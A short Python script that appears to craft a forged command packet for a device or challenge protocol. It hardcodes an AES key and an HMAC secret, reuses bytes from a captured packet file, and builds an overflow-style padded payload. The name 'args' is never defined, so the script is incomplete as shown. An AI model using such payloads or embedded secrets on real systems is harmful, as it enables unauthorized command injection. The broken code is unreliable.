#!/usr/bin/env python3

from packet_gen import *


T9_ENCRYPTION_KEY = bytes.fromhex("""
46d6 5acd cf89 ca68 a28e 4431 4b22 9ed0
36df 20ad 07b1 fc90 9b63 92df e98b 4054
3157 4da8 5e0d 98f1 a099 a996 37d4 1911
1b0e 79f8 4621 67ae a2f0 01eb a278 4c1b
264f 95f1 507e d948 68da 697a 6575 6839
08dd 96a0 64a0 783e 2fe0 65af 18a1 020c
e1d8 86d3 1199 2af6 38e0 0945 bcf9 9fe1
e800 7d6a b719 e569 6b53 5f85 9326 7a0b
0b85 1581 f888 e0e8 9e48 cef1 8fb1 5525
072c 3c42 e6a4 f4f1 52f6 f7c5 4e68 7f75
7b29 0a29 f0f9 71b1 c501 b97a 169a ee06
7a4e 1ff8 5a08 3853 4832 c3a9 5744 2d85
98f4 7022 048f 58d5 306b 9dea c34f 92d8
b948 8081 5870 96d5 6084 6caf 2e17 ff43
58ac 91d5 9f75 018d d868 10fa 21c1 940c
27cc d781 c4ec 3a93 bf6f c40e 44a0 91f2
""")

if __name__ == "__main__":

    hmac_str = b'secret_key_91579'
    with open("packet_2.bin", "rb") as f:
        t9_ecc_section_bytes = f.read()[:64]

    pg_t9 = PacketGenerator(hmac_str, t9_ecc_section_bytes,
                            aes_key_buffer=T9_ENCRYPTION_KEY)

    packet = pg_t9.gen_packet(args.command_type,
                              args.nargs,
                              [(b'a'*0x40 + b'\x01'*0x4).ljust(0x80, b'\x00')])

    print(packet.hex())

